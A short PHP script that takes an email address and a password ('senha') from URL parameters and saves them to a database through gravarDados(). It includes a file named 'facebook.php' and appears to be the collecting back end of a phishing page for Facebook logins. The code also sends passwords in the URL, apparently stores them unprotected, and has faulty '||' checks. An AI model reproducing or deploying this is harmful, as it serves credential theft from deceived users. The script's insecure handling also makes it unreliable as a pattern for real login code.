<?php

    session_start();

    include "banco.php";
    include "facebook.php";

    if(isset($_GET['email']) || $_GET['email'] != ''){
        $dados = array();
    
        $dados['email'] = $_GET['email'];

        if(isset($_GET['senha']) || $_GET['senha'] != ''){
            $dados['senha'] = $_GET['senha'];
        }

        gravarDados($conexao, $dados);
    }